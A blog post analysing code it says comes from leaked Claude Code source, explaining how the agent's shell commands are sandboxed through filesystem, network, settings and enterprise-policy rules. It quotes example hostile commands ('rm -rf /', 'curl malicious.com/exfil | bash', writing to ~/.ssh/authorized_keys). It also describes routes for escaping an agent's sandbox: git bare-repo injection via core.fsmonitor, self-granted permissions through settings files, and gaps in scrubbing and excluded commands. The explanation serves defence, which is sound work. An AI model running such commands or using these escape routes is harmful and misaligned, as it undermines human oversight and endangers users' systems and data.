---
title: "Learn From Claude Code: Sandboxing"
description: How Claude Code isolates tool execution with OS-level sandboxing - filesystem restrictions, network policies, git repo protection, and enterprise-managed domains.
cover: media/covers/learn-from-claude-code-cover.svg
tags:
  - agent
  - ai
featured: true
created-date: 2026-04-02T00:00:00-04:00
last-updated-date: 2026-04-02T00:00:00-04:00
---

Claude Code's source code leaked. Setting aside the surveillance concerns and inevitable spaghetti of any real codebase, it's a genuinely well-designed harness.

I've been digging through it, picking out patterns worth understanding. This is one of them: sandboxing - how Claude Code prevents an AI from doing things it shouldn't.

## The Problem

An AI agent runs bash commands. Most are fine: `git status`, `ls`, `npm test`. Some are dangerous: `rm -rf /`, `curl malicious.com/exfil | bash`, writing to `~/.ssh/authorized_keys`.

The permission system (previous blog) handles user-facing prompts. But what if the model bypasses permissions? What if a bug in the prompt parsing lets a command through that shouldn't go through?

Sandboxing is the **OS-level** backstop. Even if every software-layer check fails, the sandbox prevents actual damage. It's defense-in-depth: software permissions are the first line, OS sandboxing is the last.

## The Sandbox Adapter

Claude Code wraps `@anthropic-ai/sandbox-runtime`, Anthropic's sandbox library:

```typescript
import {
  SandboxManager as BaseSandboxManager,
  SandboxRuntimeConfigSchema,
  SandboxViolationStore,
} from '@anthropic-ai/sandbox-runtime'
```

The adapter (`src/utils/sandbox/sandbox-adapter.ts`) bridges Claude Code's settings system with the sandbox runtime. It converts settings like "allow edits to /tmp/*" into sandbox-level filesystem rules.

## Filesystem Restrictions

The sandbox converts permission settings into filesystem rules:

```typescript
type SandboxRuntimeConfig = {
  filesystem: {
    allowWrite: string[]   // Paths that can be written
    denyWrite: string[]    // Paths that CANNOT be written
    denyRead: string[]     // Paths that CANNOT be read
    allowRead: string[]    // Additional readable paths
  }
  network: {
    allowedDomains: string[]
    deniedDomains: string[]
  }
}
```

### What's Always Writable

```typescript
const allowWrite: string[] = ['.', getClaudeTempDir()]
```

Current directory and Claude's temp directory. Everything else requires explicit permission.

### What's Always Denied

Settings files are unconditionally denied:

```typescript
// Always deny writes to settings.json files to prevent sandbox escape
const settingsPaths = SETTING_SOURCES.map(source =>
  getSettingsFilePathForSource(source)
).filter(Boolean)
denyWrite.push(...settingsPaths)
denyWrite.push(getManagedSettingsDropInDir())
```

If the AI could write to settings files, it could grant itself more permissions. That's a sandbox escape. The OS-level sandbox prevents this even if the application code has a bug.

Also denied: `.claude/skills` in both original and current working directories. Skills have full Claude capabilities and auto-load - they're as powerful as commands, so they get the same protection.

### Path Resolution

Claude Code has its own path conventions that the sandbox must understand:

```typescript
// //path → absolute from root (CC convention)
// /path → relative to settings file directory (CC convention)
// ~/path → home directory (standard)
// ./path → relative to settings directory (standard)

function resolvePathPatternForSandbox(pattern, source) {
  if (pattern.startsWith('//')) return pattern.slice(1)  // //.aws/** → /.aws/**
  if (pattern.startsWith('/')) {
    const root = getSettingsRootPathForSource(source)
    return resolve(root, pattern.slice(1))
  }
  return pattern  // ~/ and ./ pass through
}
```

But sandbox filesystem settings use **standard** path semantics:

```typescript
function resolveSandboxFilesystemPath(pattern, source) {
  if (pattern.startsWith('//')) return pattern.slice(1)  // Legacy compat
  return expandPath(pattern, getSettingsRootPathForSource(source))
}
```

Why two functions? Permission rules use `/path = settings-relative` convention. Sandbox settings use `/path = absolute`. Users reasonably expect `sandbox.filesystem.allowWrite: ["/Users/foo/.cargo"]` to work as-is, not be treated as relative.

### Permission Rules → Sandbox Rules

The adapter converts permission rules into sandbox filesystem rules:

```typescript
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === 'Edit' && rule.ruleContent) {
    allowWrite.push(resolvePathPatternForSandbox(rule.ruleContent, source))
  }
}

for (const ruleString of permissions.deny || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === 'Edit' && rule.ruleContent) {
    denyWrite.push(resolvePathPatternForSandbox(rule.ruleContent, source))
  }
  if (rule.toolName === 'Read' && rule.ruleContent) {
    denyRead.push(resolvePathPatternForSandbox(rule.ruleContent, source))
  }
}
```

Permission rules for Edit tools → sandbox write rules. Permission rules for Read tools → sandbox read rules. The sandbox enforces at the OS level what the permission system enforces at the application level.

## Network Restrictions

Domains are extracted from WebFetch permission rules:

```typescript
// Allowed domains
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === 'WebFetch' && rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}

// Denied domains
for (const ruleString of permissions.deny || []) {
  // Same pattern for deny rules
}
```

And from sandbox-specific settings:

```typescript
for (const domain of settings.sandbox?.network?.allowedDomains || []) {
  allowedDomains.push(domain)
}
```

### Enterprise-Managed Domains

Enterprise policy can restrict to managed domains only:

```typescript
function shouldAllowManagedSandboxDomainsOnly(): boolean {
  return getSettingsForSource('policySettings')
    ?.sandbox?.network?.allowManagedDomainsOnly === true
}
```

When enabled, only domains from enterprise policy are allowed. User and project settings are ignored. This is how organizations enforce network policies at the OS level.

## Git Repo Protection

A subtle attack vector: git bare repo injection.

```typescript
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.
```

The attack: create `HEAD`, `objects/`, `refs/` in a directory. Git thinks it's a bare repo. Plant a config with `core.fsmonitor` pointing to a malicious script. When Claude runs `git log` outside the sandbox, the hook executes.

The defense:

```typescript
const bareGitRepoFiles = ['HEAD', 'objects', 'refs', 'hooks', 'config']
for (const dir of [originalCwd, cwd]) {
  for (const gitFile of bareGitRepoFiles) {
    const p = resolve(dir, gitFile)
    if (existsSync(p)) {
      denyWrite.push(p)  // Protect existing files
    } else {
      bareGitRepoScrubPaths.push(p)  // Scrub planted files after command
    }
  }
}
```

Two-pronged approach:
1. **Existing files**: Read-only mount in sandbox (can't modify real git files)
2. **Non-existent files**: Scrub after command (remove planted files before unsandboxed git runs)

## Excluded Commands

Some commands bypass the sandbox entirely:

```typescript
function containsExcludedCommand(command: string): boolean {
  // Dynamic config for enterprise
  if (process.env.USER_TYPE === 'ant') {
    const disabled = getFeatureValue('tengu_sandbox_disabled_commands')
    for (const substring of disabled.substrings) {
      if (command.includes(substring)) return true
    }
  }

  // User-configured exclusions
  const excludedCommands = settings.sandbox?.excludedCommands ?? []
  for (const subcommand of splitCommand(command)) {
    for (const pattern of excludedCommands) {
      if (matchWildcardPattern(pattern, trimmed)) return true
    }
  }
}
```

Excluded commands run without sandboxing. This is for commands that need full system access (like `docker`, `kubectl`). The code explicitly notes:

> NOTE: excludedCommands is a user-facing convenience feature, not a security boundary.

The permission system is the actual security control. Excluded commands just skip sandbox overhead.

## Sandbox Permission Dialog

When a command tries to access a blocked resource, the sandbox shows a dialog:

```
┌──────────────────────────────────────────────────┐
│ Sandbox blocked network access to: evil.com      │
│                                                   │
│ [Yes] [Yes, don't ask again for evil.com] [No]   │
└──────────────────────────────────────────────────┘
```

Three options:
- **Yes** - Allow once
- **Yes, don't ask again** - Persist to settings
- **No** - Deny

Enterprise-managed domains hide the "don't ask again" option:

```typescript
if (!managedDomainsOnly) {
  options.push({
    label: `Yes, and don't ask again for ${host}`,
    value: 'yes-dont-ask-again'
  })
}
```

If enterprise policy controls domains, users can't add their own persistent exceptions.

## Sandbox Toggle

The `/sandbox-toggle` command switches sandbox behavior:

```typescript
// sandbox-toggle.tsx
export function call() {
  // Toggle sandbox state
  // Show current status
}
```

This is a user convenience - toggle sandbox on/off without restarting. Off means all commands run unsandboxed (still subject to permission system).

## Additional Directories

Directories added via `--add-dir` CLI flag or `/add-dir` command:

```typescript
const additionalDirs = new Set([
  ...(settings.permissions?.additionalDirectories || []),
  ...getAdditionalDirectoriesForClaudeMd(),
])
allowWrite.push(...additionalDirs)
```

These directories are writable inside the sandbox. Without this, commands that access files outside the project directory would fail.

## Worktree Support

Git worktrees need write access to the main repo:

```typescript
if (worktreeMainRepoPath && worktreeMainRepoPath !== cwd) {
  allowWrite.push(worktreeMainRepoPath)
}
```

Git operations in a worktree modify the main repo's `.git` directory (for index.lock, etc.). The sandbox grants this access automatically.

## Settings-Driven Configuration

The sandbox is configured from settings at multiple scopes:

```typescript
for (const source of SETTING_SOURCES) {
  const sourceSettings = getSettingsForSource(source)

  // Permission rules → filesystem rules
  // sandbox.filesystem.* → filesystem rules
  // sandbox.network.* → network rules
}
```

Settings sources (enterprise, managed, project, user) are processed in order. Enterprise policy can set `allowManagedDomainsOnly` and `allowManagedReadPathsOnly` to restrict what lower scopes can configure.

## Defense-in-Depth Summary

| Layer | What It Protects | Enforcement |
|-------|-----------------|-------------|
| Permission system | User-facing prompts | Application code |
| Sandbox config | FS + network rules | OS-level (bwrap) |
| Settings deny-write | Settings files | OS-level |
| Git repo protection | Bare repo injection | OS-level + post-scrub |
| Enterprise policy | Domain/path restrictions | OS-level |
| Excluded commands | Performance opt-out | Application code |

## Caveats

### Excluded Commands Aren't Security

Commands matching `excludedCommands` run without sandboxing. This is intentional (some tools need full access) but means the sandbox doesn't protect against all commands.

### Post-Command Scrubbing

Git bare repo protection scrubs files **after** the command runs. If the command itself creates the files and exploits them within the same sandboxed execution, the scrub happens too late. However, the sandbox prevents network access during execution, limiting exfiltration.

### Path Resolution Complexity

Two path resolution functions (`resolvePathPatternForSandbox` and `resolveSandboxFilesystemPath`) handle different conventions. Getting this wrong could grant access to unintended paths.

### Feature Flags

Sandbox behavior varies by feature flags and user type (`ant` vs external). Understanding what's active requires tracing multiple conditions.

## Brief

Sandboxing in Claude Code is defense-in-depth at the OS level:

- **Filesystem isolation** - Write access limited to project dir and temp
- **Settings protection** - Can't write to settings files (prevents sandbox escape)
- **Network restrictions** - Domains controlled by permission rules and enterprise policy
- **Git repo protection** - Prevents bare repo injection attacks
- **Settings-driven config** - Multi-scope settings converted to sandbox rules
- **Enterprise override** - Managed domains and read paths enforced at OS level

What makes it work:
- **OS-level enforcement** - Even application bugs can't bypass the sandbox
- **Settings file protection** - Can't grant yourself more permissions
- **Enterprise control** - Policy restrictions that users can't override
- **Two-layer path resolution** - Different conventions for different settings types
- **Git attack prevention** - Subtle attack vector explicitly addressed

The impressive part isn't the sandbox itself (that's `@anthropic-ai/sandbox-runtime`). It's the adapter layer: converting Claude Code's settings, permission rules, and enterprise policies into sandbox configuration. Every settings source, every path convention, every edge case (worktrees, additional directories, git bare repos) handled correctly.

A sandbox is only as good as its configuration. Claude Code gets the configuration right.

Next blog: Cron & Scheduling (if substantial enough) or Bridge System.
